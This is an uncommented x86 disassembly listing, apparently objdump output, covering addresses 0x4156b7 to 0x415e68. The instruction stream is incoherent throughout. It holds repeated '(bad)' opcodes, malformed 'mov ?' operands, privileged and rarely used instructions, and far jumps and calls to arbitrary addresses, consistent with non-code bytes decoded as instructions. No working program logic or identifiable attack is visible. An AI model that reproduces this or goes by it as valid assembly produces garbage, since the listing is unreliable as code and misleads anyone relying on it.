  4156b7:	cmp    eax,0x603eabb2
  4156bd:	xchg   ecx,eax
  4156be:	push   edi
  4156bf:	ror    BYTE PTR [ecx+eiz*4-0x187367a7],cl
  4156c6:	jle    0x415653
  4156c8:	and    ebp,esp
  4156ca:	and    eax,0x8980b9da
  4156cf:	mov    ecx,0x7192c0bf
  4156d4:	push   edi
  4156d5:	jl     0x4156e8
  4156d7:	mov    eax,ds:0x830d2787
  4156dc:	mov    bh,bl
  4156de:	jns    0x4156a9
  4156e0:	cmp    eax,0xa5e905ec
  4156e5:	fwait
  4156e6:	or     BYTE PTR [edi+eiz*1-0x5fa3cc4c],al
  4156ed:	xlat   BYTE PTR ds:[ebx]
  4156ee:	jecxz  0x41575b
  4156f0:	aaa    
  4156f1:	nop
  4156f2:	lock cmp eax,0x63d77fa3
  4156f8:	loop   0x4156f6
  4156fa:	pusha  
  4156fb:	cmc    
  4156fc:	loop   0x4156f3
  4156fe:	dec    esi
  4156ff:	jp     0x4156db
  415701:	add    cl,BYTE PTR [eax-0x5807b121]
  415707:	mov    edi,0x5c924fe2
  41570c:	int    0x3a
  41570e:	inc    edi
  41570f:	lds    esi,FWORD PTR [edx-0x2c]
  415712:	and    BYTE PTR [edx-0x21],0x5
  415716:	mov    ?,edx
  415718:	mov    BYTE PTR [eax],al
  41571a:	ins    BYTE PTR es:[edi],dx
  41571b:	inc    edi
  41571c:	fwait
  41571d:	jmp    0x41572a
  41571f:	cmp    eax,0xb36b6e45
  415724:	pusha  
  415725:	ja     0x415785
  415727:	loopne 0x4156e9
  415729:	jmp    0xd788:0x3e6666a5
  415730:	shr    DWORD PTR [ecx],cl
  415732:	push   es
  415733:	rol    BYTE PTR [eax-0x2b],0x2f
  415737:	mov    DWORD PTR [esi],eax
  415739:	les    ebp,FWORD PTR [ebp+0x248c88d]
  41573f:	sub    eax,DWORD PTR [edx-0x46]
  415742:	push   eax
  415743:	and    DWORD PTR [eax+eax*4+0x53],ecx
  415747:	or     al,0x4c
  415749:	call   0xb011dfce
  41574e:	mov    ds:0xf03b1ee1,al
  415753:	pop    ebx
  415754:	jb     0x415720
  415756:	shl    DWORD PTR [edi+0x6c754dce],0x3e
  41575d:	sahf   
  41575e:	into   
  41575f:	jnp    0x415780
  415761:	jae    0x4157bf
  415763:	pop    ecx
  415764:	dec    ebp
  415765:	test   BYTE PTR [ebx+ecx*4+0x397c3c15],dl
  41576c:	mov    ebp,0x1373baaa
  415771:	add    esi,edi
  415773:	sbb    dl,BYTE PTR [esp+eax*1+0x34]
  415777:	mov    DWORD PTR [edi],edx
  415779:	sbb    ecx,ebx
  41577b:	add    eax,0xa8ea7d3e
  415780:	push   edx
  415781:	cmp    eax,DWORD PTR [esi]
  415783:	popa   
  415784:	push   ecx
  415785:	push   edx
  415786:	inc    esp
  415787:	stos   DWORD PTR es:[edi],eax
  415788:	mov    al,0x55
  41578a:	push   eax
  41578b:	cmp    ah,BYTE PTR [ebp+0x32eeb26c]
  415791:	pop    edx
  415792:	jmp    0x94ee:0x21a59e2c
  415799:	arpl   WORD PTR [edx+0x8fa14bb],bp
  41579f:	inc    ebp
  4157a0:	push   cs
  4157a1:	pushf  
  4157a2:	xlat   BYTE PTR ds:[ebx]
  4157a3:	push   ss
  4157a4:	popa   
  4157a5:	add    bh,bl
  4157a7:	stos   DWORD PTR es:[edi],eax
  4157a8:	push   ss
  4157a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157aa:	xchg   DWORD PTR [ebx+0x71],esp
  4157ad:	mov    ah,cl
  4157af:	loop   0x415776
  4157b1:	shl    bh,0xc4
  4157b4:	das    
  4157b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157b6:	mov    cl,0xd9
  4157b8:	retf   
  4157b9:	and    DWORD PTR [edi-0x7cbd8678],edi
  4157bf:	or     eax,0x65c006d2
  4157c4:	adc    al,0xee
  4157c6:	push   ss
  4157c7:	push   ds
  4157c8:	sub    al,0xe
  4157ca:	cmp    esp,0x55ff4b8c
  4157d0:	mov    edi,0x51c02851
  4157d5:	sub    BYTE PTR [esp+eax*8],dh
  4157d8:	shr    DWORD PTR [ebx],0x16
  4157db:	dec    edi
  4157dc:	mov    DWORD PTR [eax],edi
  4157de:	pop    edx
  4157df:	sub    al,0xbb
  4157e1:	or     DWORD PTR [ebx+ebp*2-0x4d7f6980],0x5432cb71
  4157ec:	addr16 push edi
  4157ee:	or     bl,BYTE PTR [eax-0x7dfbf17]
  4157f4:	nop
  4157f5:	pop    ecx
  4157f6:	inc    ebp
  4157f7:	retf   
  4157f8:	mov    esi,0x43799087
  4157fd:	inc    esi
  4157fe:	dec    ecx
  4157ff:	test   eax,0x4168275e
  415804:	fsubr  st(5),st
  415806:	push   0xffffff84
  415808:	adc    DWORD PTR [esi+0x12],esp
  41580b:	or     esp,esp
  41580d:	xlat   BYTE PTR ds:[ebx]
  41580e:	mov    bl,dl
  415810:	mul    BYTE PTR [edi+edx*1]
  415813:	jbe    0x415795
  415815:	jne    0x4157c1
  415817:	mov    al,ds:0xef416c8c
  41581c:	rol    BYTE PTR cs:[edi+0x14],cl
  415820:	mov    ch,0x47
  415822:	xor    eax,0x9720cbac
  415827:	lock jg 0x415860
  41582a:	push   esp
  41582b:	adc    BYTE PTR [ecx+0x4e115900],0xe9
  415832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415833:	or     al,0x39
  415835:	add    DWORD PTR [ebx-0x240bd82f],ecx
  41583b:	dec    esp
  41583c:	jmp    0x415844
  41583e:	xchg   esi,eax
  41583f:	and    eax,0x3c8254ea
  415844:	push   edi
  415845:	pop    edi
  415846:	jecxz  0x415893
  415848:	push   0x9b65973
  41584d:	aad    0xfd
  41584f:	int    0x43
  415851:	xchg   ecx,ecx
  415853:	cs ins DWORD PTR es:[edi],dx
  415855:	outs   dx,DWORD PTR ds:[esi]
  415856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415857:	cwde   
  415858:	dec    ebp
  415859:	or     bl,ch
  41585b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41585c:	pop    esi
  41585d:	and    esp,DWORD PTR [edi]
  41585f:	fcmovu st,st(5)
  415861:	fcomp  DWORD PTR [eax]
  415863:	mov    ecx,0x5bea1d0d
  415868:	(bad)  
  41586a:	(bad)
  41586d:	jmp    0x415869
  41586f:	stc    
  415870:	mov    ebp,0xa9aaa833
  415875:	cmp    dl,BYTE PTR [edx]
  415877:	mov    ch,0xac
  415879:	je     0x41580f
  41587b:	call   0x6f1e:0xc7865952
  415882:	cld    
  415883:	push   ds
  415884:	pop    ds
  415885:	(bad)  
  415886:	mov    ebp,0x999b537e
  41588b:	or     BYTE PTR [eax-0x46],cl
  41588e:	mov    ds:0xda5739ca,al
  415893:	das    
  415894:	jns    0x415837
  415896:	lea    ecx,[si]
  415899:	xchg   ecx,eax
  41589a:	sub    al,0x80
  41589c:	xor    DWORD PTR [ebx],0xffffffef
  41589f:	sub    esp,esp
  4158a1:	cmp    DWORD PTR [esp+ebx*4+0x6d2e9801],edx
  4158a8:	sar    BYTE PTR [ebx],cl
  4158aa:	(bad)  
  4158ab:	or     cl,BYTE PTR es:[edi*4-0x6bcc7276]
  4158b3:	in     eax,dx
  4158b4:	mov    al,ds:0xf93dc78e
  4158b9:	stc    
  4158ba:	or     DWORD PTR [ebx+ebx*2-0x66face40],edi
  4158c1:	dec    eax
  4158c2:	je     0x415936
  4158c4:	call   0xe30d6d71
  4158c9:	and    BYTE PTR [esi+0x41],bh
  4158cc:	test   eax,0x6cbeeec2
  4158d1:	ficom  DWORD PTR [ecx-0x43c8c222]
  4158d7:	(bad)  
  4158d8:	adc    eax,0x91ded73b
  4158dd:	dec    ecx
  4158de:	xor    al,0x9b
  4158e0:	and    al,0xc
  4158e2:	(bad)  
  4158e3:	ss (bad) 
  4158e5:	xor    eax,0x44c1c59b
  4158ea:	cmp    al,0x75
  4158ec:	mov    dl,0xad
  4158ee:	mov    dl,0x32
  4158f0:	xchg   ecx,eax
  4158f1:	add    al,0x29
  4158f3:	sar    DWORD PTR [edx+0x78],0xde
  4158f7:	rcl    DWORD PTR [ebx-0x5cf1bfb9],1
  4158fd:	ret    0xa8e0
  415900:	jle    0x41595d
  415902:	ja     0x4158e8
  415904:	add    DWORD PTR [edx+eiz*8-0x52c3db43],ebp
  41590b:	add    al,BYTE PTR [esi-0x17]
  41590e:	cmp    esi,DWORD PTR [ebx+esi*2-0x50]
  415912:	sub    eax,0x83cef058
  415917:	enter  0xc657,0xb9
  41591b:	loope  0x415954
  41591d:	jns    0x41590c
  41591f:	mov    dh,ch
  415921:	inc    ebx
  415922:	mov    eax,0x1593a543
  415927:	retf   0xc586
  41592a:	inc    edx
  41592b:	loope  0x415943
  41592d:	icebp  
  41592e:	push   ebp
  41592f:	in     eax,0xa9
  415931:	pop    ss
  415932:	popf   
  415933:	dec    edx
  415934:	mov    dh,0x83
  415936:	inc    eax
  415937:	(bad)  
  415938:	xor    ebx,DWORD PTR [edx+0x59f9c7b]
  41593e:	jmp    0xe3ef15e5
  415943:	and    eax,0x1b7d3b70
  415948:	mov    cs,edx
  41594a:	adc    BYTE PTR fs:[ebp+0x56fcf030],dl
  415951:	xchg   edx,eax
  415952:	(bad)  
  415953:	mov    ah,al
  415955:	sub    edx,DWORD PTR [eax-0x59fbd4e5]
  41595b:	pop    esi
  41595c:	cmp    DWORD PTR [eax],esp
  41595e:	imul   ecx,DWORD PTR [ebx-0x414c183a],0x6b46592
  415968:	inc    esi
  415969:	pop    ebp
  41596a:	sbb    DWORD PTR [edi],0x46688216
  415970:	call   0xed8cb0a
  415975:	es push edi
  415977:	and    al,BYTE PTR [ebx+0x73fbd957]
  41597d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41597e:	sub    BYTE PTR [edi+0x11],0x96
  415982:	out    dx,eax
  415983:	ds xchg esi,eax
  415985:	cmp    DWORD PTR [ecx+0x61],ebx
  415988:	xchg   BYTE PTR [esp+ecx*2-0x5e],bh
  41598c:	es xor al,0xd3
  41598f:	popa   
  415990:	mov    ch,0x2b
  415992:	mov    esi,DWORD PTR [eax+0x7c]
  415995:	bound  edi,QWORD PTR [ebx+0x1f]
  415998:	inc    ecx
  415999:	data16 ror BYTE PTR [ecx+0x2f],1
  41599d:	inc    ebp
  41599e:	and    eax,0x1a44cad4
  4159a3:	adc    eax,0xfa9c945a
  4159a8:	fcomp  QWORD PTR [esi-0x5bca6c1c]
  4159ae:	test   ecx,esi
  4159b0:	in     al,0xbf
  4159b2:	sbb    DWORD PTR [ebx+edx*1+0x78],0xffffffd2
  4159b7:	inc    esp
  4159b8:	sbb    eax,0xb050aa04
  4159bd:	cmp    al,0xd6
  4159bf:	retf   
  4159c0:	ret    0x53df
  4159c3:	add    DWORD PTR [esi+eiz*1+0x15],edx
  4159c7:	popf   
  4159c8:	icebp  
  4159c9:	sahf   
  4159ca:	cmc    
  4159cb:	vmwrite ecx,DWORD PTR [ebx+0x44]
  4159cf:	sub    bh,BYTE PTR [ebx]
  4159d1:	stos   DWORD PTR es:[edi],eax
  4159d2:	(bad)  
  4159d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159d4:	aam    0xda
  4159d6:	or     BYTE PTR [eax-0x1e],al
  4159d9:	ss ss pop ebx
  4159dc:	push   ebx
  4159de:	stos   DWORD PTR es:[edi],eax
  4159df:	cld    
  4159e0:	jmp    0x4159e8
  4159e2:	xor    bl,ch
  4159e4:	mov    edi,0xa48d445c
  4159e9:	or     eax,0xc337b589
  4159ee:	cmp    eax,0x923d4112
  4159f3:	clc    
  4159f4:	popw   ss
  4159f6:	mov    esp,0xd8b99cd5
  4159fb:	cs in  al,0xf7
  4159fe:	imul   eax,DWORD PTR [ebp+eax*8+0x1],0x23
  415a03:	adc    BYTE PTR [ecx+0x6be19b13],0x58
  415a0a:	and    bh,al
  415a0c:	aas    
  415a0d:	imul   esp,DWORD PTR [eax+0x180774df],0x6d3dbe3d
  415a17:	xchg   edi,eax
  415a18:	xchg   ebp,eax
  415a19:	mul    BYTE PTR [edi]
  415a1b:	xor    bl,BYTE PTR [ecx+ecx*4]
  415a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a1f:	jne    0x4159ce
  415a21:	xchg   ebp,eax
  415a22:	mov    ds:0xe6bf14a2,al
  415a27:	adc    DWORD PTR [ebx+esi*4],ebp
  415a2a:	mov    DWORD PTR [ebx+ebp*4],edi
  415a2d:	popa   
  415a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a2f:	sahf   
  415a30:	mov    al,0xf4
  415a32:	mov    DWORD PTR [esi+eiz*2],0xfb0a218c
  415a39:	mov    ebx,0xa9695ca3
  415a3e:	js     0x4159e8
  415a40:	add    eax,edx
  415a42:	cmp    al,0xf0
  415a44:	(bad)  
  415a45:	cli    
  415a46:	imul   BYTE PTR [ebx+0x11b09d04]
  415a4c:	sbb    BYTE PTR [edx-0x62],dl
  415a4f:	mov    ah,0x16
  415a51:	imul   esi,DWORD PTR [edi+0x797aafb4],0xffffff98
  415a58:	idiv   DWORD PTR [ebp+esi*1-0x7b]
  415a5c:	jno    0x415a20
  415a5e:	jp     0x4159f4
  415a60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a61:	pop    ecx
  415a62:	out    0x7,eax
  415a64:	sbb    ebp,DWORD PTR [ebx+0x6f5b2e30]
  415a6a:	sbb    al,0x11
  415a6c:	(bad)  
  415a6d:	push   ecx
  415a6e:	not    DWORD PTR [edi+0x6f]
  415a71:	xor    eax,0xe8dcece6
  415a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a77:	into   
  415a78:	jle    0x415ae7
  415a7a:	xchg   ebx,eax
  415a7b:	push   ebx
  415a7c:	loopne 0x415ae9
  415a7e:	cdq    
  415a7f:	xchg   esi,eax
  415a80:	add    DWORD PTR [ecx+0x26d78f9f],edi
  415a86:	mov    ds:0x1a005320,al
  415a8b:	ss pusha 
  415a8d:	pop    esp
  415a8e:	push   es
  415a8f:	push   0xb1614e19
  415a94:	(bad)  
  415a95:	cmp    al,0x1d
  415a97:	mov    eax,0x1980eb0f
  415a9c:	retf   0xfd07
  415a9f:	mov    ds:0xfa349a1c,al
  415aa4:	pop    ecx
  415aa5:	imul   edx,ecx,0xffffffc5
  415aa8:	ss push 0x5c429717
  415aae:	inc    eax
  415aaf:	mov    bl,0x5a
  415ab1:	arpl   WORD PTR [edi-0x44fb7915],bx
  415ab7:	xor    ebp,DWORD PTR [esi]
  415ab9:	mov    bl,0x36
  415abb:	imul   esi,DWORD PTR [edx],0x15
  415abe:	push   ds
  415abf:	repnz loop 0x415ad0
  415ac2:	(bad)  
  415ac3:	das    
  415ac4:	sub    eax,0x15a50ba5
  415ac9:	inc    ecx
  415aca:	stc    
  415acb:	add    DWORD PTR [edi+ecx*8+0x33],edi
  415acf:	outs   dx,BYTE PTR ds:[esi]
  415ad0:	mov    ?,edi
  415ad2:	add    al,0x87
  415ad4:	and    bh,BYTE PTR [edi-0x6b]
  415ad7:	lods   eax,DWORD PTR ds:[esi]
  415ad8:	lods   eax,DWORD PTR ds:[esi]
  415ad9:	lahf   
  415ada:	cmp    BYTE PTR [ecx-0x1],dh
  415add:	ss mov bl,0x95
  415ae0:	sti    
  415ae1:	xchg   edi,eax
  415ae2:	mov    ebp,0x1f28ab62
  415ae7:	push   ebx
  415ae8:	sub    bl,BYTE PTR [ecx]
  415aea:	add    al,0x7b
  415aec:	ss mov ecx,0x9f9ca1f
  415af2:	and    al,0xf0
  415af4:	pop    ds
  415af5:	push   edi
  415af6:	retf   0xa509
  415af9:	ficomp WORD PTR [eax-0x16298c09]
  415aff:	xor    al,0xf6
  415b01:	cdq    
  415b02:	scas   eax,DWORD PTR es:[edi]
  415b03:	js     0x415aff
  415b05:	fild   WORD PTR [esi+0x8]
  415b08:	sub    cl,BYTE PTR [esi+0x2d]
  415b0b:	jl     0x415b35
  415b0d:	mov    eax,0x789c36b5
  415b12:	xlat   BYTE PTR ds:[ebx]
  415b13:	jb     0x415ad3
  415b15:	adc    BYTE PTR [ebp+edx*4-0x80],al
  415b19:	jo     0x415b2c
  415b1b:	add    al,0xa1
  415b1d:	or     al,0xa6
  415b1f:	into   
  415b20:	aaa    
  415b21:	lea    eax,[eax+0x7d]
  415b24:	stos   BYTE PTR es:[edi],al
  415b25:	test   BYTE PTR [edi+0x7c13b60a],ch
  415b2b:	mov    al,dl
  415b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b2e:	xchg   DWORD PTR [edi+esi*4+0x71],edx
  415b32:	retf   0xb329
  415b35:	or     BYTE PTR [esi-0x25],al
  415b38:	mov    ds:0x245456b8,al
  415b3d:	ins    DWORD PTR es:[edi],dx
  415b3e:	js     0x415b1b
  415b40:	mov    cl,0x36
  415b42:	sar    BYTE PTR [esi*2+0x156b551],1
  415b49:	pop    esp
  415b4a:	mov    bh,0xe2
  415b4c:	ins    BYTE PTR es:[edi],dx
  415b4d:	clc    
  415b4e:	lods   eax,DWORD PTR ds:[esi]
  415b4f:	lods   eax,DWORD PTR ds:[esi]
  415b50:	inc    ebp
  415b51:	xchg   edx,eax
  415b52:	pop    es
  415b53:	and    ecx,eax
  415b55:	lahf   
  415b56:	mov    edi,edi
  415b58:	(bad)  
  415b59:	je     0x415b92
  415b5b:	cwde   
  415b5c:	neg    DWORD PTR [ecx+0x45]
  415b5f:	ja     0x415bb3
  415b61:	inc    edi
  415b62:	imul   ebp,edi,0x20f4651f
  415b68:	mov    ebx,0x95f75ced
  415b6d:	pop    edx
  415b6e:	sub    al,0x17
  415b70:	xor    DWORD PTR [ecx],ebx
  415b72:	add    bh,cl
  415b74:	lods   al,BYTE PTR ds:[esi]
  415b75:	fild   DWORD PTR [edi+0x53]
  415b78:	cmc    
  415b79:	stc    
  415b7a:	dec    esp
  415b7b:	dec    ebp
  415b7c:	int3   
  415b7d:	xchg   ebx,eax
  415b7e:	xchg   edx,eax
  415b7f:	jnp    0x415bf5
  415b81:	fs stos BYTE PTR es:[edi],al
  415b83:	out    dx,al
  415b84:	aas    
  415b85:	aam    0x12
  415b87:	xor    esp,DWORD PTR [eax+0x9]
  415b8a:	fmulp  st(0),st
  415b8c:	pop    es
  415b8d:	mov    ecx,0x455296a
  415b92:	cli    
  415b93:	out    dx,eax
  415b94:	jb     0x415ba1
  415b96:	popf   
  415b97:	mov    edx,0xbc2567b6
  415b9c:	fcmovb st,st(7)
  415b9e:	ror    al,cl
  415ba0:	ins    BYTE PTR es:[edi],dx
  415ba1:	ins    BYTE PTR es:[edi],dx
  415ba2:	or     al,0xbd
  415ba4:	retf   
  415ba5:	and    eax,0x2fcb80d2
  415baa:	lock push edi
  415bac:	fnsave [edx]
  415bae:	mov    BYTE PTR [ebx+edx*1],bh
  415bb1:	daa    
  415bb2:	fcom   QWORD PTR [ebx]
  415bb4:	shl    DWORD PTR [esi+ebx*8-0x3c928bc4],cl
  415bbb:	cld    
  415bbc:	mov    ds:0x4259234,eax
  415bc1:	sti    
  415bc2:	out    dx,eax
  415bc3:	mov    ds:0x6bf2a072,eax
  415bc8:	push   esi
  415bc9:	xchg   ecx,eax
  415bca:	sub    al,ch
  415bcc:	repnz mov edx,0x11fefcbd
  415bd2:	or     al,0x13
  415bd4:	push   ds
  415bd5:	adc    edi,DWORD PTR [edi]
  415bd7:	mov    al,ds:0x2fc2e902
  415bdc:	retf   0xdd75
  415bdf:	or     BYTE PTR [edi+eiz*8+0x6a870817],cl
  415be6:	aam    0xdc
  415be8:	mov    eax,DWORD PTR [ebp+0x13]
  415beb:	arpl   WORD PTR [edi+0x531d39d6],si
  415bf1:	cmp    al,0xbf
  415bf3:	xchg   edi,eax
  415bf4:	repnz cmp al,0xde
  415bf7:	repz push cs
  415bf9:	or     BYTE PTR [bx+si+0x61],ah
  415bfd:	push   esi
  415bfe:	jbe    0x415c02
  415c00:	loope  0x415c61
  415c02:	adc    eax,0x983fd7df
  415c07:	cmp    dl,BYTE PTR [ebx+0x62]
  415c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c0b:	lock pop ss
  415c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c0e:	pop    esi
  415c0f:	int3   
  415c10:	dec    ebx
  415c11:	arpl   WORD PTR [edx-0x3a471dec],bx
  415c17:	outs   dx,BYTE PTR ds:[esi]
  415c18:	ss inc esi
  415c1a:	jmp    0x6a54f97e
  415c1f:	jbe    0x415bec
  415c21:	dec    eax
  415c22:	mov    eax,ds:0x67126dcc
  415c27:	leave  
  415c28:	adc    al,0x3b
  415c2a:	int    0x5e
  415c2c:	(bad)  
  415c2d:	cwde   
  415c2e:	sub    dl,BYTE PTR [eax-0x16027e56]
  415c34:	adc    al,0xdd
  415c36:	pop    esp
  415c37:	icebp  
  415c38:	imul   ebx,DWORD PTR [ebp-0x2ee6961e],0x903076a3
  415c42:	leave  
  415c43:	adc    bl,dl
  415c45:	icebp  
  415c46:	mov    cl,0xd5
  415c48:	inc    ebp
  415c49:	fist   DWORD PTR [edx-0x33]
  415c4c:	inc    eax
  415c4d:	pusha  
  415c4e:	icebp  
  415c4f:	lea    ebp,[edi]
  415c51:	cmp    eax,0x9f849d51
  415c56:	or     eax,0x777d4244
  415c5b:	daa    
  415c5c:	xor    dl,BYTE PTR [edx+0x64]
  415c5f:	or     al,0x7f
  415c61:	push   edi
  415c62:	inc    ebp
  415c63:	sub    dl,BYTE PTR [edi-0x55]
  415c66:	sbb    cl,BYTE PTR [edx+0x102d5027]
  415c6c:	test   al,0x96
  415c6e:	mov    esp,0x9e9046c7
  415c73:	into   
  415c74:	pop    es
  415c75:	out    dx,al
  415c76:	sub    edx,0xffffffe3
  415c79:	mov    esp,0xda6bb46
  415c7e:	adc    DWORD PTR [edx],edx
  415c80:	fdiv   QWORD PTR [ebp+ecx*1+0xa15a611]
  415c87:	idiv   DWORD PTR [ebp+0x1422f3ac]
  415c8d:	sar    al,1
  415c8f:	into   
  415c90:	adc    eax,0xde77037
  415c95:	xchg   BYTE PTR [esi-0x28],dl
  415c98:	dec    eax
  415c99:	xor    BYTE PTR [eax+0x5214a2ac],al
  415c9f:	sub    edx,DWORD PTR [edx+0x50]
  415ca2:	dec    ebx
  415ca3:	push   cs
  415ca4:	ss or  eax,0xb6f28984
  415caa:	fmul   st,st(6)
  415cac:	loopne 0x415cc5
  415cae:	fs jae 0x415cd6
  415cb1:	or     ecx,esp
  415cb3:	lds    esp,FWORD PTR [esi]
  415cb5:	ins    BYTE PTR es:[edi],dx
  415cb6:	ds js  0x415c90
  415cb9:	aas    
  415cba:	out    dx,eax
  415cbb:	(bad)  
  415cbc:	daa    
  415cbd:	shl    ah,cl
  415cbf:	pop    ebx
  415cc0:	stos   BYTE PTR es:[edi],al
  415cc1:	mov    bl,0x2f
  415cc3:	scas   eax,DWORD PTR es:[edi]
  415cc4:	mov    eax,0xc9800840
  415cc9:	mov    ds:0x6b498371,eax
  415cce:	loopne 0x415cb9
  415cd0:	inc    ecx
  415cd1:	and    ebp,DWORD PTR [ebp-0x384ed4cf]
  415cd7:	fsubp  st(4),st
  415cd9:	rcl    ah,1
  415cdb:	mov    ds:0x810b15dc,al
  415ce0:	sbb    al,0x47
  415ce2:	(bad)  
  415ce3:	pop    ss
  415ce4:	mov    al,ds:0x6ab3c10d
  415ce9:	cdq    
  415cea:	xchg   ecx,eax
  415ceb:	mov    bh,0xc8
  415ced:	retf   
  415cee:	cmp    esi,0x5d34d98f
  415cf4:	add    edx,eax
  415cf6:	push   eax
  415cf7:	and    al,0x3e
  415cf9:	imul   ecx,ecx,0x3805c97b
  415cff:	push   ds
  415d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d01:	push   esp
  415d02:	mov    dl,0xf4
  415d04:	lahf   
  415d05:	mov    ebp,0xb2cc8de6
  415d0a:	push   ecx
  415d0b:	mov    edi,0x7bf89def
  415d10:	das    
  415d11:	or     BYTE PTR [ecx-0x30d69eb1],0x57
  415d18:	jnp    0x415d1a
  415d1a:	pop    es
  415d1b:	ins    BYTE PTR es:[edi],dx
  415d1c:	mov    es,WORD PTR [ebx+0x65]
  415d1f:	sbb    edx,DWORD PTR [eax-0x524b8bba]
  415d25:	inc    esi
  415d26:	cmp    cl,BYTE PTR [eax-0x7f]
  415d29:	jge    0x415cd0
  415d2b:	and    esi,DWORD PTR [ebx+0x5b]
  415d2e:	sbb    al,0xb9
  415d30:	in     eax,dx
  415d31:	push   ss
  415d32:	std    
  415d33:	push   cs
  415d34:	xchg   DWORD PTR [ecx+0x1e],ebx
  415d37:	pop    esp
  415d38:	push   ecx
  415d39:	push   0xffffff82
  415d3b:	pop    ebx
  415d3c:	push   cs
  415d3d:	dec    ecx
  415d3e:	xchg   BYTE PTR [eax+0x8],dl
  415d41:	mov    dl,BYTE PTR [ebx]
  415d43:	pop    ss
  415d44:	inc    ebp
  415d45:	(bad)  
  415d46:	push   cs
  415d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d48:	ffree  st(5)
  415d4a:	adc    edx,esi
  415d4c:	das    
  415d4d:	mov    al,BYTE PTR [edx+0x73977115]
  415d53:	jp     0x415ced
  415d55:	lock data16 mov cl,0xf9
  415d59:	daa    
  415d5a:	pop    edx
  415d5b:	retf   0x32a5
  415d5e:	jge    0x415d71
  415d60:	add    dh,bh
  415d62:	add    BYTE PTR [esp+eiz*2+0x438f9711],ch
  415d69:	ins    DWORD PTR es:[edi],dx
  415d6a:	mov    ch,0x42
  415d6c:	pop    edi
  415d6d:	jmp    0xe87a51d7
  415d72:	mov    eax,ds:0x8849537e
  415d77:	dec    ecx
  415d78:	rcr    BYTE PTR ds:0xf57950dd,0x23
  415d7f:	(bad)  
  415d80:	cmp    al,0x79
  415d82:	scas   al,BYTE PTR es:[edi]
  415d83:	scas   eax,DWORD PTR es:[edi]
  415d84:	test   al,0x14
  415d86:	pop    esp
  415d87:	fcmovne st,st(2)
  415d89:	into   
  415d8a:	xchg   ebp,eax
  415d8b:	sbb    eax,0x6a12d3c3
  415d90:	push   eax
  415d91:	icebp  
  415d92:	adc    BYTE PTR [ebx+ecx*1],cl
  415d95:	dec    edx
  415d96:	stc    
  415d97:	das    
  415d98:	popf   
  415d99:	enter  0xc6ba,0xe
  415d9d:	push   ebp
  415d9e:	bound  esi,QWORD PTR [edi]
  415da0:	js     0x415d8e
  415da2:	leave  
  415da3:	mov    al,0x3c
  415da5:	push   ebp
  415da6:	aas    
  415da7:	retf   0x879c
  415daa:	push   es
  415dab:	fimul  WORD PTR [esi+0x2285628e]
  415db1:	adc    DWORD PTR [ecx-0x4f],eax
  415db4:	shl    BYTE PTR [ebx-0x7f],1
  415db7:	jno    0x415d9b
  415db9:	sbb    al,0x42
  415dbb:	mov    ch,0xd2
  415dbd:	fadd   DWORD PTR [esi-0x206d749b]
  415dc3:	loopne 0x415de6
  415dc5:	mov    al,0x1d
  415dc7:	inc    ebp
  415dc8:	pop    ds
  415dc9:	inc    ebx
  415dca:	fistp  DWORD PTR [ecx]
  415dcc:	push   ebx
  415dcd:	xlat   BYTE PTR ds:[ebx]
  415dce:	(bad)
  415dd3:	mov    esp,0xb988f8ca
  415dd8:	sbb    DWORD PTR [bx+di],eax
  415ddb:	add    ebx,esi
  415ddd:	test   al,0x64
  415ddf:	pop    edi
  415de0:	fild   WORD PTR ds:0xf3962a52
  415de6:	mov    BYTE PTR [esi],0xc2
  415de9:	cmp    al,0x4d
  415deb:	push   edx
  415dec:	inc    ebp
  415ded:	pusha  
  415dee:	push   ebp
  415def:	or     eax,0x5702bb38
  415df4:	int    0x50
  415df6:	pusha  
  415df7:	mov    ah,0xe7
  415df9:	pop    edx
  415dfa:	gs leave 
  415dfc:	or     eax,0x383411dc
  415e01:	fsubr  DWORD PTR [ebx]
  415e03:	jae    0x415dd7
  415e05:	adc    DWORD PTR [ebx],edi
  415e07:	push   ebx
  415e08:	ficomp DWORD PTR ds:0xe988b979
  415e0e:	imul   esp,esp,0xffffffbb
  415e11:	xchg   esi,eax
  415e12:	dec    edx
  415e13:	cmp    ebp,DWORD PTR [edx]
  415e15:	outs   dx,BYTE PTR ds:[esi]
  415e16:	sbb    BYTE PTR [edi],0xca
  415e19:	les    esi,FWORD PTR [esi+0x71]
  415e1c:	jmp    0xe8f5:0xa509ddc4
  415e23:	loop   0x415e3f
  415e25:	fadd   QWORD PTR [edi]
  415e27:	pop    es
  415e28:	xor    ecx,DWORD PTR [ebp+0x5d]
  415e2b:	mov    esi,0x5f6fc3e3
  415e30:	shl    BYTE PTR [ebx-0x2fd6237d],0xdb
  415e37:	and    esi,DWORD PTR [esi-0x76]
  415e3a:	stc    
  415e3b:	(bad)  
  415e3c:	(bad)  [edi]
  415e3e:	sub    eax,0x12acb8e5
  415e43:	fs xor dh,bh
  415e46:	retf   
  415e47:	add    bl,dl
  415e49:	test   BYTE PTR [esi+0x76],dl
  415e4c:	pop    ebp
  415e4d:	outs   dx,DWORD PTR ds:[esi]
  415e4e:	mov    esp,DWORD PTR [ebx]
  415e50:	mov    cl,0xc4
  415e52:	icebp  
  415e53:	fld    TBYTE PTR [eax+eax*1]
  415e56:	fcmove st,st(4)
  415e58:	aaa    
  415e59:	cmc    
  415e5a:	sub    al,0x6b
  415e5c:	pop    esi
  415e5d:	jecxz  0x415df4
  415e5f:	xchg   ecx,eax
  415e60:	sub    ebp,ecx
  415e62:	sub    bh,BYTE PTR [esi+edi*4-0x56]
  415e66:	pop    ebp
  415e67:	cld    
  415e68:	loopne 0x415ebd
